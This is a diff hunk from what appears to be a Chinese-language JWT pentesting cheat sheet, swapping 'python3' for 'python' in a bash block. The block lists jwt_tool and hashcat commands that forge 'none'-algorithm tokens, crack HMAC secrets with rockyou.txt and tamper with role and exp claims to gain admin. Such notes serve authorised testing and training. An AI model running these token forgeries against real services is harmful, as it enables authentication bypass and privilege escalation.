@@ -219,18 +219,18 @@ if __name__ == "__main__":
 
 ```bash
 # 解码
-python3 jwt_tool.py "$TOKEN"
+python jwt_tool.py "$TOKEN"
 
 # none
-python3 jwt_tool.py "$TOKEN" -X n -I -pc role -pv admin
+python jwt_tool.py "$TOKEN" -X n -I -pc role -pv admin
 
 # HMAC secret
 hashcat -m 16500 jwt.txt rockyou.txt
-python3 jwt_tool.py "$TOKEN" -C -d rockyou.txt
+python jwt_tool.py "$TOKEN" -C -d rockyou.txt
 
 # claim 单变量
-python3 jwt_tool.py "$TOKEN" -I -pc exp -pv 9999999999
-python3 jwt_tool.py "$TOKEN" -I -pc role -pv admin
+python jwt_tool.py "$TOKEN" -I -pc exp -pv 9999999999
+python jwt_tool.py "$TOKEN" -I -pc role -pv admin
 
 # JWKS/OIDC
 curl -s https://target.example/.well-known/openid-configuration
